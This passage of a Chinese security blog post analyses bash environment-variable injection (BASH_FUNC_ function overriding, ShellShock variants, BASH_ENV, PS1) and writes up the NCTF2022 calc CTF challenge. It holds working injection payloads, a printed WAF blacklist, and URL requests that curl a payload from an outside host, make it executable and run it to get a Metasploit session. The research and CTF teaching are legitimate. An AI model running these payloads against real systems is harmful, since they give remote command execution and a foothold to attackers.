+        namelen <span class="token operator">=</span> char_index <span class="token operator">-</span> BASHFUNC_PREFLEN <span class="token operator">-</span> BASHFUNC_SUFFLEN<span class="token punctuation">;</span>
+
+        tname <span class="token operator">=</span> name <span class="token operator">+</span> BASHFUNC_PREFLEN<span class="token punctuation">;</span>    <span class="token comment">/* start of func name */</span>
+        tname<span class="token punctuation">[</span>namelen<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token char">'\0'</span><span class="token punctuation">;</span>      <span class="token comment">/* now tname == func name */</span>
+
+        string_length <span class="token operator">=</span> <span class="token function">strlen</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        temp_string <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">xmalloc</span> <span class="token punctuation">(</span>namelen <span class="token operator">+</span> string_length <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token function">memcpy</span> <span class="token punctuation">(</span>temp_string<span class="token punctuation">,</span> tname<span class="token punctuation">,</span> namelen<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        temp_string<span class="token punctuation">[</span>namelen<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token char">' '</span><span class="token punctuation">;</span>
+        <span class="token function">memcpy</span> <span class="token punctuation">(</span>temp_string <span class="token operator">+</span> namelen <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> string<span class="token punctuation">,</span> string_length <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token comment">/* Don't import function names that are invalid identifiers from the
+         environment in posix mode, though we still allow them to be defined as
+         shell variables. */</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">absolute_program</span> <span class="token punctuation">(</span>tname<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>posixly_correct <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">||</span> <span class="token function">legal_identifier</span> <span class="token punctuation">(</span>tname<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+            <span class="token function">parse_and_execute</span> <span class="token punctuation">(</span>temp_string<span class="token punctuation">,</span> tname<span class="token punctuation">,</span> SEVAL_NONINT<span class="token operator">|</span>SEVAL_NOHIST<span class="token operator">|</span>SEVAL_FUNCDEF<span class="token operator">|</span>SEVAL_ONECMD<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">else</span>
+            <span class="token function">free</span> <span class="token punctuation">(</span>temp_string<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment">/* parse_and_execute does this */</span>
+        <span class="token comment">//...</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure>
+<p>这里for遍历了所有环境变量，并用 = 分割，<code>name</code>是环境变量，<code>string</code>是值。<br>
+当满足下面这些条件的情况下，<code>temp_string</code>将被传入<code>parse_and_execute</code>执行：</p>
+<ul>
+<li><code>privmode == 0</code>，即不能传入<code>-p</code>参数</li>
+<li><code>read_but_dont_execute == 0</code>，即不能传入<code>-n</code>参数</li>
+<li><code>STREQN (BASHFUNC_PREFIX, name, BASHFUNC_PREFLEN)</code>，环境变量名前10个字符等于<code>BASH_FUNC_</code></li>
+<li><code>STREQ (BASHFUNC_SUFFIX, name + char_index - BASHFUNC_SUFFLEN)</code>，环境变量名后两个字符等于<code>%%</code></li>
+<li><code>STREQN (&quot;() &#123;&quot;, string, 4)</code>，环境变量的值前4个字符等于<code>() &#123;</code></li>
+</ul>
+<p>前两个条件肯定是满足的，后三个条件是用户可控的，所以这个if语句是肯定可以进入的。进入if语句后，去除前缀<code>BASH_FUNC_</code>和后缀<code>%%</code>的部分将是一个变量名，而由<code>() &#123;</code>开头的字符串将会被执行。</p>
+<p>这里其实做的就是一件事：<strong>根据环境变量的值初始化一个匿名函数，并赋予其名字</strong>。</p>
+<p>所以，我们传入下面这样一个环境变量，将会在Bash上下文中添加一个myfunc函数：</p>
+<figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">env</span> <span class="token string">$'BASH_FUNC_myfunc%%=() &#123; id; &#125;'</span> <span class="token function">bash</span> -c <span class="token string">'myfunc'</span>`<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure>
+<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/media/attachment/2022/02/21/0619bb4a-7419-4cc4-9527-1435bbb3636b.png"><img src="https://www.leavesongs.com/media/attachment/2022/02/21/0619bb4a-7419-4cc4-9527-1435bbb3636b.00fa91df112a.png" srcset="/img/loading.gif" lazyload alt="image.png"></a></p>
+<p>这里仍然存在一个问题是，因为在执行<code>parse_and_execute</code>的时候配置了<code>SEVAL_FUNCDEF</code>，我们只能利用这个方法定义函数，而无法逃逸出函数执行任意命令。解决这个问题的方法也很简单，我们只需要覆盖一些已有的“命令”，在后面执行这个命令的时候就可以执行到我们定义的函数里了。</p>
+<p>那么，回到本文开头说的那个问题，我添加了一个名为<code>echo</code>的函数，这样在执行<code>echo hello</code>的时候实际上执行的是我添加的函数：</p>
+<figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">env</span> <span class="token string">$'BASH_FUNC_echo%%=() &#123; id; &#125;'</span> <span class="token function">bash</span> -c <span class="token string">'echo hello'</span>`<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure>
+<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/media/attachment/2022/02/21/37d67a06-6efd-4758-878e-e69eecc526b4.png"><img src="https://www.leavesongs.com/media/attachment/2022/02/21/37d67a06-6efd-4758-878e-e69eecc526b4.0e974983ad60.png" srcset="/img/loading.gif" lazyload alt="image.png"></a></p>
+<p>几乎成功解决了这个问题。</p>
+<h3 id="解决小瑕疵"><a class="header-anchor" href="#解决小瑕疵">¶</a>解决小瑕疵</h3>
+<p>但是以上注入的办法是在<code>bash4.4</code>之后才可以执行，因为<code>BASH_FUNC_</code>这个Trick是在4.4以后才有的，所以低版本也要想一个利用办法。</p>
+<p>这次发现的这个POC和ShellShock的POC很相似，原因就是，这个<code>BASH_FUNC</code>的环境变量，就是因为修复ShellShock而引入的。所以突破点实际上也可以从这里出发。</p>
+<p>在ShellShock刚出现的时候，Bash的最新版本是4.3，这也是为什么Bash 4.4的时候引入了<code>BASH_FUNC</code>。但是，这不代表4.4以下的Bash就没有修复ShellShock漏洞，那么，他们是怎么修复的呢？</p>
+<p>经过研究发现，CentOS 7这类操作系统虽然修复了ShellShock漏洞，但是并不是通过升级Bash版本来修复的，而是通过“打补丁”。</p>
+<p>我们来看看redhat对于Bash 4.2的补丁：<a target="_blank" rel="noopener" href="https://bugzilla-attachments.redhat.com/attachment.cgi?id=941826">https://bugzilla-attachments.redhat.com/attachment.cgi?id=941826</a></p>
+<figure><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token operator">--</span><span class="token operator">-</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span>bash<span class="token operator">-</span><span class="token number">4.2</span><span class="token operator">-</span>orig<span class="token operator">/</span>variables<span class="token punctuation">.</span>c    <span class="token number">2014</span><span class="token operator">-</span><span class="token number">09</span><span class="token operator">-</span><span class="token number">25</span> <span class="token number">13</span><span class="token operator">:</span><span class="token number">07</span><span class="token operator">:</span><span class="token number">59.313209541</span> <span class="token operator">+</span><span class="token number">0200</span>
+<span class="token operator">++</span><span class="token operator">+</span> variables<span class="token punctuation">.</span>c <span class="token number">2014</span><span class="token operator">-</span><span class="token number">09</span><span class="token operator">-</span><span class="token number">25</span> <span class="token number">13</span><span class="token operator">:</span><span class="token number">15</span><span class="token operator">:</span><span class="token number">29.869420719</span> <span class="token operator">+</span><span class="token number">0200</span>
+@@ <span class="token operator">-</span><span class="token number">268</span><span class="token punctuation">,</span><span class="token number">7</span> <span class="token operator">+</span><span class="token number">268</span><span class="token punctuation">,</span><span class="token number">7</span> @@
+ <span class="token keyword">static</span> <span class="token keyword">void</span> propagate_temp_var <span class="token function">__P</span><span class="token punctuation">(</span><span class="token punctuation">(</span>PTR_T<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+ <span class="token keyword">static</span> <span class="token keyword">void</span> dispose_temporary_env <span class="token function">__P</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">sh_free_func_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     
+
+<span class="token operator">-</span><span class="token keyword">static</span> <span class="token keyword">inline</span> <span class="token keyword">char</span> <span class="token operator">*</span>mk_env_string <span class="token function">__P</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token operator">+</span><span class="token keyword">static</span> <span class="token keyword">inline</span> <span class="token keyword">char</span> <span class="token operator">*</span>mk_env_string <span class="token function">__P</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+ <span class="token keyword">static</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>make_env_array_from_var_list <span class="token function">__P</span><span class="token punctuation">(</span><span class="token punctuation">(</span>SHELL_VAR <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+ <span class="token keyword">static</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>make_var_export_array <span class="token function">__P</span><span class="token punctuation">(</span><span class="token punctuation">(</span>VAR_CONTEXT <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+ <span class="token keyword">static</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>make_func_export_array <span class="token function">__P</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+@@ <span class="token operator">-</span><span class="token number">301</span><span class="token punctuation">,</span><span class="token number">6</span> <span class="token operator">+</span><span class="token number">301</span><span class="token punctuation">,</span><span class="token number">14</span> @@
+ <span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>
+ <span class="token punctuation">&#125;</span>
+
+<span class="token operator">+</span><span class="token comment">/* Prefix and suffix for environment variable names which contain
++   shell functions. */</span>
+<span class="token operator">+</span>#define FUNCDEF_PREFIX <span class="token string">"BASH_FUNC_"</span>
+<span class="token operator">+</span>#define <span class="token function">FUNCDEF_PREFIX_LEN</span> <span class="token punctuation">(</span><span class="token function">strlen</span> <span class="token punctuation">(</span>FUNCDEF_PREFIX<span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token operator">+</span>#define FUNCDEF_SUFFIX <span class="token string">"()"</span>
+<span class="token operator">+</span>#define <span class="token function">FUNCDEF_SUFFIX_LEN</span> <span class="token punctuation">(</span><span class="token function">strlen</span> <span class="token punctuation">(</span>FUNCDEF_SUFFIX<span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token operator">+</span>
+<span class="token operator">+</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure>
+<p>可见，在这个补丁里也引入了<code>FUNCDEF_PREFIX</code>和<code>FUNCDEF_SUFFIX</code>，只不过和4.4以下的有一处差异：<strong>Bash 4.4下<code>FUNCDEF_SUFFIX</code>等于<code>%%</code>，而这个4.2的补丁中<code>FUNCDEF_SUFFIX</code>等于<code>()</code></strong>。</p>
+<p>所以在更低版本的bash中，失败的原因是变量名的错误，下面改变poc即可成功。</p>
+<figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">env</span> <span class="token string">$'BASH_FUNC_echo()=() &#123; id; &#125;'</span> <span class="token function">bash</span> -c <span class="token string">"echo hello"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure>
+<p>所以，之后我们遇到环境变量注入，可以进行下列三种测试：</p>
+<ul>
+<li>Bash没有修复ShellShock漏洞：直接使用ShellShock的POC进行测试，例如<code>TEST=() &#123; :; &#125;; id;</code></li>
+<li>Bash 4.4以前：<code>env $'BASH_FUNC_echo()=() &#123; id; &#125;' bash -c &quot;echo hello&quot;</code></li>
+<li>Bash 4.4及以上：<code>env $'BASH_FUNC_echo%%=() &#123; id; &#125;' bash -c 'echo hello'</code></li>
+</ul>
+<p>在CentOS系系统下完美解决本文开头提到的问题，通杀所有Bash。</p>
+<h1>0x03 总结</h1>
+<p>本文完整地讲述了我是如何研究环境变量注入导致的安全问题。</p>
+<p>经过阅读dash和bash的代码，我发现了这样一些可以导致命令注入的环境变量：</p>
+<ul>
+<li><code>BASH_ENV</code>：可以在<code>bash -c</code>的时候注入任意命令</li>
+<li><code>ENV</code>：可以在<code>sh -i -c</code>的时候注入任意命令</li>
+<li><code>PS1</code>：可以在<code>sh</code>或<code>bash</code>交互式环境下执行任意命令</li>
+<li><code>PROMPT_COMMAND</code>：可以在<code>bash</code>交互式环境下执行任意命令</li>
+<li><code>BASH_FUNC_xxx%%</code>：可以在<code>bash -c</code>或<code>sh -c</code>的时候执行任意命令</li>
+</ul>
+<p>利用最后一个trick，功在CentOS下解决了本文开头提出的问题。<br>
+同时在不同版本的centos下也有了不容的poc。</p>
+<h1>0x04 拓展</h1>
+<p>从分析问题的角度来看，在php中考虑开头的问题，总共分析了以下几点：</p>
+<ul>
+<li>分析源码转化问题</li>
+<li>分析 bash dash 和 system执行的命令<br>
+所以，当我们遇到环境变量可控的时候，除了尝试以上已经发现的poc之外，还可以尝试一下分析system执行的命令，有没有新的环境变量利用途径。</li>
+</ul>
+<p>同时考虑到分析的第一点，转化为问题，php中的system最终调用的是<code>sh -c</code> 那么在其他的语言中，是否也有类似问题？</p>
+<p>如果调用的是 sh 的话，是不是能进一步扩大get shell的范围？</p>
+<h2 id="例题-NCTF2022-calc-calc-revenge"><a class="header-anchor" href="#例题-NCTF2022-calc-calc-revenge">¶</a>例题 NCTF2022 calc/calc_revenge</h2>
+<p>关键代码如下：</p>
+<figure><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/calc"</span><span class="token punctuation">,</span>methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">calc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    ip <span class="token operator">=</span> request<span class="token punctuation">.</span>remote_addr
+    num <span class="token operator">=</span> request<span class="token punctuation">.</span>values<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"num"</span><span class="token punctuation">)</span>
+    log <span class="token operator">=</span> <span class="token string">"echo &#123;0&#125; &#123;1&#125;> ./tmp/log.txt"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>strftime<span class="token punctuation">(</span><span class="token string">"%Y%m%d-%H%M%S"</span><span class="token punctuation">,</span>time<span class="token punctuation">.</span>localtime<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>ip<span class="token punctuation">)</span>
+    
+    <span class="token keyword">if</span> waf<span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">try</span><span class="token punctuation">:</span>
+            data <span class="token operator">=</span> <span class="token builtin">eval</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span>
+            os<span class="token punctuation">.</span>system<span class="token punctuation">(</span>log<span class="token punctuation">)</span>
+        <span class="token keyword">except</span><span class="token punctuation">:</span>
+            <span class="token keyword">pass</span>
+        <span class="token keyword">return</span> <span class="token builtin">str</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>
+    <span class="token keyword">else</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span> <span class="token string">"waf!!"</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure>
+<p>就注意一个eval执行不报错的情况下，把命令传入system执行，且能够把回显带出来，这反而让绕waf变成了主要目的了，这也导致了很多非预期的出现，先看一下非预期是怎么解决的。</p>
+<p>因为开了debug模式，导致可以在错误界面看到waf的规则。</p>
+<figure><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">waf</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    blacklist <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'import'</span><span class="token punctuation">,</span><span class="token string">'('</span><span class="token punctuation">,</span><span class="token string">')'</span><span class="token punctuation">,</span><span class="token string">'#'</span><span class="token punctuation">,</span><span class="token string">'@'</span><span class="token punctuation">,</span><span class="token string">'^'</span><span class="token punctuation">,</span><span class="token string">'$'</span><span class="token punctuation">,</span><span class="token string">','</span><span class="token punctuation">,</span><span class="token string">'>'</span><span class="token punctuation">,</span><span class="token string">'?'</span><span class="token punctuation">,</span><span class="token string">'`'</span><span class="token punctuation">,</span><span class="token string">' '</span><span class="token punctuation">,</span><span class="token string">'_'</span><span class="token punctuation">,</span><span class="token string">'|'</span><span class="token punctuation">,</span><span class="token string">';'</span><span class="token punctuation">,</span><span class="token string">'"'</span><span class="token punctuation">,</span><span class="token string">'&#123;'</span><span class="token punctuation">,</span><span class="token string">'&#125;'</span><span class="token punctuation">,</span><span class="token string">'&amp;'</span><span class="token punctuation">,</span><span class="token string">'getattr'</span><span class="token punctuation">,</span><span class="token string">'os'</span><span class="token punctuation">,</span><span class="token string">'system'</span><span class="token punctuation">,</span><span class="token string">'class'</span><span class="token punctuation">,</span><span class="token string">'subclasses'</span><span class="token punctuation">,</span><span class="token string">'mro'</span><span class="token punctuation">,</span><span class="token string">'request'</span><span class="token punctuation">,</span><span class="token string">'args'</span><span class="token punctuation">,</span><span class="token string">'eval'</span><span class="token punctuation">,</span><span class="token string">'if'</span><span class="token punctuation">,</span><span class="token string">'subprocess'</span><span class="token punctuation">,</span><span class="token string">'file'</span><span class="token punctuation">,</span><span class="token string">'open'</span><span class="token punctuation">,</span><span class="token string">'popen'</span><span class="token punctuation">,</span><span class="token string">'builtins'</span><span class="token punctuation">,</span><span class="token string">'compile'</span><span class="token punctuation">,</span><span class="token string">'execfile'</span><span class="token punctuation">,</span><span class="token string">'from_pyfile'</span><span class="token punctuation">,</span><span class="token string">'config'</span><span class="token punctuation">,</span><span class="token string">'local'</span><span class="token punctuation">,</span><span class="token string">'self'</span><span class="token punctuation">,</span><span class="token string">'item'</span><span class="token punctuation">,</span><span class="token string">'getitem'</span><span class="token punctuation">,</span><span class="token string">'getattribute'</span><span class="token punctuation">,</span><span class="token string">'func_globals'</span><span class="token punctuation">,</span><span class="token string">'__init__'</span><span class="token punctuation">,</span><span class="token string">'join'</span><span class="token punctuation">,</span><span class="token string">'__dict__'</span><span class="token punctuation">]</span>
+    flag <span class="token operator">=</span> <span class="token boolean">True</span>
+    <span class="token keyword">for</span> no <span class="token keyword">in</span> blacklist<span class="token punctuation">:</span>
+        <span class="token keyword">if</span> no<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">in</span> s<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+            flag<span class="token operator">=</span> <span class="token boolean">False</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span>no<span class="token punctuation">)</span>
+            <span class="token keyword">break</span>
+    <span class="token keyword">return</span> flag<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure>
+<p>发现<code>%0a</code>可以换行，分割不同命令，使用<code>%09</code>可以代替空格，然后使用单引号把命令包起来，又因为是出网环境，所以可以直接curl 下载payload配合msf上线。</p>
+<figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">/calc?num<span class="token operator">=</span>%0a<span class="token string">'curl'</span>%09<span class="token string">'http://x.x.x.x:yyyy/testapp'</span>%09<span class="token string">'-o'</span>%09<span class="token string">'/tmp/testapp'</span>%0a
+/calc?num<span class="token operator">=</span>%0a<span class="token string">'chmod'</span>%09<span class="token string">'777'</span>%09<span class="token string">'/tmp/testapp'</span>%0a
+/calc?num<span class="token operator">=</span>%0a<span class="token string">'/tmp/testapp'</span>%0a<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></div></figure>
+<p>执行了一个testapp的shellcode。</p>
+<h2 id="预期"><a class="header-anchor" href="#预期">¶</a>预期</h2>
+<p>但是如果这题没有开启debug模式，虽然还是可以用上面的方式做，但是猜到waf还是需要一点时间的，回去看预期解，在python中system函数，最终的调用也是<code>sh -c</code>，所以可以考虑使用p神的poc进行攻击，那么问题就来到了如何使用eval控制环境变量？</p>
+<p><a target="_blank" rel="noopener" href="https://aluvion.github.io/2019/05/02/Python%E9%BB%91%E9%AD%94%E6%B3%95-%E7%BB%95%E8%BF%87%E7%A9%BA%E6%A0%BC%E5%AE%9E%E7%8E%B0%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/">python黑魔法-绕过空格实现变量覆盖</a><br>
+通过eval函数实现变量覆盖，在python中是可以实现的，实际上这并不是eval函数的特性，而是python的特性。</p>
+<ol>
+<li><code>&gt;&gt;&gt; a = 0</code></li>
+<li><code>&gt;&gt;&gt; for a in [1]:</code></li>
+<li><code>… pass</code></li>
+<li><code>…</code></li>
+<li><code>&gt;&gt;&gt; a</code></li>
+<li><code>1</code></li>
+<li><code>&gt;&gt;&gt;</code><br>
+利用list，可以达成一些变量的重新赋值，在不使用空格的情况下，用python的list生成器语法，也可以达到目的。</li>
+</ol>
+<figure><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> a <span class="token operator">=</span> <span class="token number">0</span>
+<span class="token operator">>></span><span class="token operator">></span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token keyword">for</span><span class="token punctuation">[</span>a<span class="token punctuation">]</span><span class="token keyword">in</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span>
+<span class="token punctuation">[</span><span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'str'</span><span class="token operator">></span><span class="token punctuation">]</span>
+<span class="token operator">>></span><span class="token operator">></span> a
+<span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure>
+<p>这行代码的意思是遍历 [1] 这个 list ，赋值给 a，然后再返回一个 str，因为没有执行的原因，所以返回的是一个函数：</p>
+<figure><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token keyword">for</span><span class="token punctuation">[</span>a<span class="token punctuation">,</span>b<span class="token punctuation">]</span><span class="token keyword">in</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">,</span><span class="token string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span>
+<span class="token punctuation">[</span><span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'str'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'str'</span><span class="token operator">></span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div></figure>
+<p>这样看起来可能有点抽象，下面再给几个例子。</p>
+<figure><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">]</span>
+<span class="token punctuation">[</span><span class="token string">''</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">]</span>
+<span class="token operator">>></span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></div></figure>
+<p>这是没有绕过空格的情况，因为list生成器，导致每执行一次for循环都会调用一次str函数，而str函数返回是空，所以最后就没有生成字符，返回一个空字符串列表。<br>
+而利用上面的赋值，再对a进行修改：</p>
+<figure><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> a <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'test'</span><span class="token punctuation">:</span><span class="token string">'asd'</span><span class="token punctuation">&#125;</span>
+<span class="token operator">>></span><span class="token operator">></span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token keyword">for</span><span class="token punctuation">[</span>a<span class="token punctuation">[</span><span class="token string">'test'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token keyword">in</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span>
+<span class="token punctuation">[</span><span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'str'</span><span class="token operator">></span><span class="token punctuation">]</span>
+<span class="token operator">>></span><span class="token operator">></span> a
+<span class="token punctuation">&#123;</span><span class="token string">'test'</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure>
+<p>利用for循环对a修改且不会报错，最终要的是，命令只有一行，可以eval直接执行，所以可以利用这个对环境变量注入。</p>
+<figure><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> os<span class="token punctuation">.</span>environ<span class="token punctuation">[</span><span class="token string">'abc'</span><span class="token punctuation">]</span>
+Traceback <span class="token punctuation">(</span>most recent call last<span class="token punctuation">)</span><span class="token punctuation">:</span>
+  File <span class="token string">"&lt;stdin>"</span><span class="token punctuation">,</span> line <span class="token number">1</span><span class="token punctuation">,</span> <span class="token keyword">in</span> <span class="token operator">&lt;</span>module<span class="token operator">></span>
+  File <span class="token string">"D:\softwares\Conda\lib\os.py"</span><span class="token punctuation">,</span> line <span class="token number">675</span><span class="token punctuation">,</span> <span class="token keyword">in</span> __getitem__
+    <span class="token keyword">raise</span> KeyError<span class="token punctuation">(</span>key<span class="token punctuation">)</span> <span class="token keyword">from</span> <span class="token boolean">None</span>
+KeyError<span class="token punctuation">:</span> <span class="token string">'abc'</span>
+<span class="token operator">>></span><span class="token operator">></span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token keyword">for</span><span class="token punctuation">[</span>os<span class="token punctuation">.</span>environ<span class="token punctuation">[</span><span class="token string">'abc'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token keyword">in</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token string">'1'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span>
+<span class="token punctuation">[</span><span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'str'</span><span class="token operator">></span><span class="token punctuation">]</span>
+<span class="token operator">>></span><span class="token operator">></span> os<span class="token punctuation">.</span>environ<span class="token punctuation">[</span><span class="token string">'abc'</span><span class="token punctuation">]</span>
